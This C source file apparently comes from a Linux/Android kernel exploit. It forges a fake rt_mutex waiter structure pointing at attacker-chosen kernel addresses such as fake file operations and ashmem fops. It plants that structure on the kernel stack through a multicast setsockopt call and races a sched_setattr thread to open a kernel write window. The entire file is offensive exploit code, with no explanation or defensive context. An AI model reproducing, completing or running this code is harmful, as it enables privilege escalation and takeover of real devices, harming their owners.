#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

#if SLIDE_USE_MCAST

void slide_build_fake_waiter(unsigned char *payload, size_t waiter_off) {
  uintptr_t tree_parent = slide_oracle_parent;
  uintptr_t tree_right = 0;
  uintptr_t tree_left = slide_oracle_target;
  uintptr_t pi_parent = slide_oracle_parent;
  uintptr_t pi_right = 0;
  uintptr_t pi_left = slide_oracle_target;

#if defined(PRODUCTION_STACK_PI_RIGHT_ONLY) && \
    PRODUCTION_STACK_PI_RIGHT_ONLY
  if (slide_oracle_parent == fake_fops &&
      slide_oracle_target == data_addr(ASHMEM_MISC_FOPS)) {
    tree_right = slide_oracle_target;
    tree_left = 0;
    pi_parent = fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF;
    pi_right = 0;
    pi_left = 0;
  }
#endif

  memset(payload + waiter_off, 0, FAKE_WAITER_LAYOUT_SIZE);
  put_fake_waiter(payload, waiter_off,
                  tree_parent, tree_right, tree_left,
                  pi_parent, pi_right, pi_left,
                  fake_task, fake_lock, FAKE_WAITER_PRIO);
}

void slide_mcast_stack_copy(void) {
  enum { stamp_size = 0x108 };
  _Static_assert(MCAST_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <= stamp_size,
                 "MCAST waiter must fit in the copied stack stamp");
  unsigned char stamp[stamp_size];
  memset(stamp, 0, sizeof(stamp));
  uint16_t invalid_family = AF_UNSPEC;
  memcpy(stamp + 0x08, &invalid_family, sizeof(invalid_family));
  slide_build_fake_waiter(stamp, MCAST_WAITER_OFF);

  int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    pr_error("slide mcast socket errno=%d\n", errno);
    return;
  }

  slide_reset_consume_state();

  errno = 0;
  int ret = setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
                       stamp, sizeof(stamp));
  int saved_errno = errno;
  atomic_store(&slide_consume_go, 1);
  while (!atomic_load(&slide_consume_stop))
    __asm__ volatile("yield" ::: "memory");
  atomic_store(&slide_consume_go, 0);

  int sched_ok = atomic_load(&slide_consume_sched_ok);
  atomic_store(&slide_stack_write_window,
               ret == -1 && saved_errno == EADDRNOTAVAIL && sched_ok > 0);
  pr_info("slide mcast returned domain=%d level=%d option=%d "
          "offset=%#x ret=%d errno=%d "
          "calls=%d sched_ok=%d last_sched_ret=%d last_sched_errno=%d\n",
          AF_INET, IPPROTO_IP, MCAST_BLOCK_SOURCE,
          MCAST_WAITER_OFF, ret, saved_errno,
          atomic_load(&slide_consume_calls), sched_ok,
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
  close(fd);
}

void *slide_mcast_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  atomic_store(&slide_consumer_ready, 1);
  int *errno_ptr = &errno;

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

    int tid = atomic_load(&slide_waiter_tid);

    if (seq == 1) {
      slide_apply_route_fine_delay();
    }

    int calls = atomic_load(&slide_consume_calls);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    atomic_store(&slide_consume_calls, calls + 1);
    *errno_ptr = 0;
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    int saved_errno = *errno_ptr;
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

#endif /* SLIDE_USE_MCAST */
